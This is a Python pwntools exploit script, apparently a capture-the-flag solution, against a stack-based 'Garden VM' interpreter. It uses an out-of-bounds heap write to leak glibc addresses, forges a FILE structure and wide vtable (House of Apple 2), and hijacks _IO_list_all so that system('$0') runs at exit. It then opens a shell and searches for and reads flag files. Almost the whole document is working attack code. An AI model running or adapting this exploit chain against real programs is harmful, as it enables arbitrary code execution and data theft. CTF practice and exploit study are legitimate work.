#!/usr/bin/env python3
"""
Garden VM Exploit - FSOP via House of Apple 2

1. Cascading memmove: BIG.length=0xFFFF (OOB), OH header intact {5,4}
2. OH.obj_size expansion via BIG OOB write → 256KB OOB on glibc heap
3. Libc leak via unsorted bin fd/bk at OH.data[40:41]
4. Build fake FILE + _IO_wide_data + wide_vtable in OH's data buffer
5. Overwrite _IO_list_all to point to fake FILE
6. Exit triggers _IO_flush_all -> _IO_wfile_overflow -> system("$0") -> shell
"""
from pwn import *
import re, subprocess, sys

context.arch = 'amd64'
context.log_level = 'info'

PUSH_NUM_ARRAY = 0
ADD_NUMS = 1; SUB_NUMS = 2; MUL_NUMS = 3; DIV_NUMS = 4; MOD_NUMS = 5
GET_ELEM_OBJ = 6; SET_ELEM_OBJ = 7; GET_ELEM_NUM = 8; SET_ELEM_NUM = 9
PRINT_NUM_ARRAY = 10; GET_OFFHEAP_NUM = 11; SET_OFFHEAP_NUM = 12
NEW_ARRAY_OBJ = 13; NEW_ARRAY_NUM = 14; NEW_OFFHEAP_OBJ = 15
DUP = 16; SWAP = 17; DROP = 18; DUP_X1 = 19
GARBAGE_COLLECT = 20

def push_num(vals):
    if isinstance(vals, int): vals = [vals]
    return [PUSH_NUM_ARRAY, len(vals)] + [v & 0xFFFFFFFF for v in vals]

# Libc offsets (glibc 2.39)
LIBC_LEAK_OFF      = 0x203b20
SYSTEM_OFF         = 0x58750
IO_LIST_ALL_OFF    = 0x2044c0
IO_WFILE_JUMPS_OFF = 0x202228

DELTA_SYSTEM       = (SYSTEM_OFF - LIBC_LEAK_OFF) & 0xFFFFFFFF
DELTA_IO_LIST_ALL  = (IO_LIST_ALL_OFF - LIBC_LEAK_OFF) & 0xFFFFFFFF
DELTA_WFILE_JUMPS  = (IO_WFILE_JUMPS_OFF - LIBC_LEAK_OFF) & 0xFFFFFFFF

# Fake FILE at OH.data[0..], wide_data at [128..], wide_vtable at [192..], lock at [224..]
FAKE_FILE_START    = 0
FAKE_WDATA_START   = 128   # byte offset 512
FAKE_WVTABLE_START = 192   # byte offset 768
FAKE_LOCK_START    = 224   # byte offset 896

FLAGS_VALUE = 0x00003024   # "$0\x00\x00" -> system("$0") -> shell

# STORE layout: [0]=OH, [1]=BIG, [2]=dptr_lo, [3]=dptr_hi,
#               [4]=leak_lo, [5]=leak_hi, [6]=temp, [7]=unused

# Helper functions
def emit_store_get(idx):
    """[STORE] -> [STORE, STORE[idx]]"""
    return [DUP] + push_num([idx]) + [GET_ELEM_OBJ]

def emit_store_set(idx):
    """[STORE, val] -> [STORE]. Saves val to STORE[idx]."""
    return [SWAP, DUP_X1, SWAP] + push_num([idx]) + [SET_ELEM_OBJ]

def emit_big_write_imm(entry_idx, value):
    """Write immediate to BIG[entry_idx]. [STORE] -> [STORE]."""
    return emit_store_get(1) + push_num([value]) + push_num([entry_idx]) + [SET_ELEM_NUM]

def emit_big_read(entry_idx):
    """Read BIG[entry_idx]. [STORE] -> [STORE, result_1elem]."""
    return emit_store_get(1) + push_num([entry_idx]) + [GET_ELEM_NUM]

def emit_oh_write_imm(oh_idx, value):
    """Write immediate to OH.data[oh_idx]. [STORE] -> [STORE]."""
    return emit_store_get(0) + push_num([value]) + push_num([oh_idx]) + [SET_OFFHEAP_NUM]

def emit_oh_read_print(oh_idx):
    """Read OH.data[oh_idx] and print. [STORE] -> [STORE]."""
    return emit_store_get(0) + push_num([oh_idx]) + [GET_OFFHEAP_NUM, PRINT_NUM_ARRAY]

def emit_oh_read_to_store(oh_idx, store_idx):
    """Read OH.data[oh_idx] into STORE[store_idx]. [STORE] -> [STORE]."""
    return emit_store_get(0) + push_num([oh_idx]) + [GET_OFFHEAP_NUM] + emit_store_set(store_idx)

def emit_oh_write_from_store(oh_idx, store_idx):
    """Write STORE[store_idx] to OH.data[oh_idx]. [STORE] -> [STORE].
    Uses DUP DUP pattern to get both OH and value from STORE."""
    return ([DUP, DUP] + push_num([0]) + [GET_ELEM_OBJ, SWAP] +
            push_num([store_idx]) + [GET_ELEM_OBJ] +
            push_num([oh_idx]) + [SET_OFFHEAP_NUM])

def emit_big_write_from_store(entry_idx, store_idx):
    """Write STORE[store_idx] to BIG[entry_idx]. [STORE] -> [STORE]."""
    return ([DUP, DUP] + push_num([1]) + [GET_ELEM_OBJ, SWAP] +
            push_num([store_idx]) + [GET_ELEM_OBJ] +
            push_num([entry_idx]) + [SET_ELEM_NUM])

def emit_compute_store(result_idx, src_idx, delta):
    """STORE[result_idx] = STORE[src_idx] + delta. [STORE] -> [STORE]."""
    return emit_store_get(src_idx) + push_num([delta & 0xFFFFFFFF]) + [ADD_NUMS] + emit_store_set(result_idx)

# ================================================================
# Build instruction stream
# ================================================================
N_EXTRA = 70
big_entries = [0]*195 + [0x00040005]

insns = []

# ---- Phase 1: Setup + Cascading Memmove Corruption ----
insns += push_num([0x0000FFFF])       # SAC
insns += push_num(big_entries)         # BIG (196 entries)
insns += push_num([1])
insns += [NEW_OFFHEAP_OBJ]           # OH

for i in range(N_EXTRA):
    insns += push_num([i])

insns += [GARBAGE_COLLECT]            # Clean GC

# Null-ref GC
insns += push_num([1])
insns += [NEW_ARRAY_OBJ, DUP]
insns += push_num([0])
insns += [GET_ELEM_OBJ]
insns += [GARBAGE_COLLECT]
insns += [DROP, DROP]                 # null_ref, OA
for _ in range(N_EXTRA):
    insns += [DROP]
# Stack: [SAC, BIG, OH]
# BIG.length = 0xFFFF (OOB), OH header intact {5,4}

# ---- Phase 2: Create STORE ----
insns += push_num([8])
insns += [NEW_ARRAY_OBJ]             # STORE
insns += [DUP_X1, SWAP]
insns += push_num([0])
insns += [SET_ELEM_OBJ]              # STORE[0] = OH
insns += [DUP_X1, SWAP]
insns += push_num([1])
insns += [SET_ELEM_OBJ]              # STORE[1] = BIG
insns += [SWAP, DROP]                # Drop SAC
# Stack: [STORE]

# ---- Phase 3: Expand OH.obj_size, read data_ptr ----
insns += emit_big_write_imm(200, 0x10000)    # OH.obj_size = 0x10000

insns += emit_big_read(198)
insns += emit_store_set(2)                    # STORE[2] = dptr_lo
insns += emit_big_read(199)
insns += emit_store_set(3)                    # STORE[3] = dptr_hi

# Print dptr
insns += emit_store_get(2) + [PRINT_NUM_ARRAY]
insns += emit_store_get(3) + [PRINT_NUM_ARRAY]

# ---- Phase 4: Leak libc ----
insns += emit_oh_read_print(40)               # leak_lo
insns += emit_oh_read_print(41)               # leak_hi
insns += emit_oh_read_to_store(40, 4)         # STORE[4] = leak_lo
insns += emit_oh_read_to_store(41, 5)         # STORE[5] = leak_hi

# ---- Phase 5: Write fake FILE structure into OH.data ----

# _flags = "$0\x00\x00" at data[0]
insns += emit_oh_write_imm(FAKE_FILE_START + 0, FLAGS_VALUE)

# _mode = 1 at data[48] (FILE offset 0xc0)
insns += emit_oh_write_imm(FAKE_FILE_START + 48, 1)

# _chain = 0 at data[26:27] (FILE offset 0x68) - terminate list
insns += emit_oh_write_imm(FAKE_FILE_START + 26, 0)
insns += emit_oh_write_imm(FAKE_FILE_START + 27, 0)

# _lock = data_ptr + FAKE_LOCK_START*4 at data[34:35] (FILE offset 0x88)
insns += emit_compute_store(6, 2, FAKE_LOCK_START * 4)
insns += emit_oh_write_from_store(FAKE_FILE_START + 34, 6)
insns += emit_oh_write_from_store(FAKE_FILE_START + 35, 3)

# Zero the lock area (data[224..227])
for i in range(4):
    insns += emit_oh_write_imm(FAKE_LOCK_START + i, 0)

# _wide_data = data_ptr + FAKE_WDATA_START*4 at data[40:41] (FILE offset 0xa0)
insns += emit_compute_store(6, 2, FAKE_WDATA_START * 4)
insns += emit_oh_write_from_store(FAKE_FILE_START + 40, 6)
insns += emit_oh_write_from_store(FAKE_FILE_START + 41, 3)

# vtable = _IO_wfile_jumps at data[54:55] (FILE offset 0xd8)
insns += emit_compute_store(6, 4, DELTA_WFILE_JUMPS)
insns += emit_oh_write_from_store(FAKE_FILE_START + 54, 6)
insns += emit_oh_write_from_store(FAKE_FILE_START + 55, 5)
# hi word: delta is -0x18F8 -> with carry from lo add, hi = leak_hi

# ---- Phase 5b: Write fake _IO_wide_data ----

# Zero _IO_write_base (wdata +0x18 = indices 134:135)
insns += emit_oh_write_imm(FAKE_WDATA_START + 6, 0)
insns += emit_oh_write_imm(FAKE_WDATA_START + 7, 0)

# _IO_write_ptr = 1 (wdata +0x20 = index 136)
insns += emit_oh_write_imm(FAKE_WDATA_START + 8, 1)
insns += emit_oh_write_imm(FAKE_WDATA_START + 9, 0)

# Zero _IO_buf_base (wdata +0x30 = indices 140:141)
insns += emit_oh_write_imm(FAKE_WDATA_START + 12, 0)
insns += emit_oh_write_imm(FAKE_WDATA_START + 13, 0)

# _wide_vtable = data_ptr + FAKE_WVTABLE_START*4 (wdata +0xe0 = indices 184:185)
insns += emit_compute_store(6, 2, FAKE_WVTABLE_START * 4)
insns += emit_oh_write_from_store(FAKE_WDATA_START + 56, 6)
insns += emit_oh_write_from_store(FAKE_WDATA_START + 57, 3)

# ---- Phase 5c: Write fake wide vtable ----

# __doallocate at vtable +0x68 = indices 218:219 (FAKE_WVTABLE_START + 26:27)
insns += emit_compute_store(6, 4, DELTA_SYSTEM)
insns += emit_oh_write_from_store(FAKE_WVTABLE_START + 26, 6)
insns += emit_oh_write_from_store(FAKE_WVTABLE_START + 27, 5)

# ---- Phase 6: Redirect OH.data_ptr to _IO_list_all and write our fake FILE addr ----

# Compute _IO_list_all address (lo word)
insns += emit_compute_store(6, 4, DELTA_IO_LIST_ALL)
# hi word: delta is +0x9A0 (small, no carry -> hi = leak_hi)

# Redirect OH.data_ptr by writing to BIG[198:199]
insns += emit_big_write_from_store(198, 6)   # OH.data_ptr_lo = list_all_lo
insns += emit_big_write_from_store(199, 5)   # OH.data_ptr_hi = leak_hi

# Now OH.data[0] = *_IO_list_all (lo), OH.data[1] = *_IO_list_all (hi)
# Write data_ptr (original OH data buffer = our fake FILE) to _IO_list_all
insns += emit_oh_write_from_store(0, 2)      # _IO_list_all lo = dptr_lo
insns += emit_oh_write_from_store(1, 3)      # _IO_list_all hi = dptr_hi

# ---- Phase 7: Cleanup and exit ----
insns += [DROP]  # Drop STORE

print(f"Total instructions: {len(insns)}", file=sys.stderr)

# ================================================================
# Run
# ================================================================
def run_exploit(local=True):
    if local:
        p = process(['./garden'])
    else:
        p = remote('garden.chals.dicec.tf', 1337)
        p.recvuntil(b'proof of work:\n')
        pow_cmd = p.recvline().strip().decode()
        log.info(f"PoW: {pow_cmd}")
        p.recvuntil(b'solution: ')
        result = subprocess.check_output(pow_cmd, shell=True).strip()
        log.info(f"Solution: {result}")
        p.sendline(result)

    p.recvuntil(b'words): ')
    p.sendline(str(len(insns)).encode())
    p.recvuntil(b':\n')
    payload = ' '.join(str(x) for x in insns) + '\n'
    p.send(payload.encode())
    p.recvuntil(b'Starting interpretation\n')
    return p

local = '--remote' not in sys.argv
p = run_exploit(local=local)

# Parse 4 output lines: dptr_lo, dptr_hi, leak_lo, leak_hi
vals = []
for i in range(4):
    line = p.recvline(timeout=15)
    m = re.search(rb'\[(\d+)\]', line)
    v = int(m.group(1)) if m else 0
    vals.append(v)
    log.info(f"Line {i}: {v:#010x}")

dptr_lo, dptr_hi, leak_lo, leak_hi = vals
data_ptr = (dptr_hi << 32) | dptr_lo
leak = (leak_hi << 32) | leak_lo
libc_base = leak - LIBC_LEAK_OFF

log.success(f"data_ptr  = {data_ptr:#018x}")
log.success(f"leak      = {leak:#018x}")
log.success(f"libc_base = {libc_base:#018x}")
log.success(f"system    = {libc_base + SYSTEM_OFF:#018x}")

if libc_base & 0xfff != 0:
    log.error("libc_base not page-aligned!")

log.info("Waiting for shell...")
import time
time.sleep(1)

try:
    p.sendline(b'id')
    result = p.recvuntil(b'uid=', timeout=5)
    if b'uid=' in result:
        log.success("Got shell!")
        rest = p.recvline()
        log.info(f"id: uid={rest.decode().strip()}")
        p.sendline(b'find / -name "flag*" -type f 2>/dev/null; cat /flag.txt /flag /app/flag.txt /home/*/flag.txt 2>/dev/null')
        time.sleep(2)
        out = p.recv(timeout=3)
        log.info(f"Flag search: {out.decode()}")
        p.interactive()
    else:
        log.warning(f"No shell. Output: {result[:200]}")
except Exception as e:
    log.warning(f"Exception: {e}")
    try:
        rest = p.recvall(timeout=3)
        log.info(f"Remaining: {rest[:500]}")
    except:
        pass
p.close()
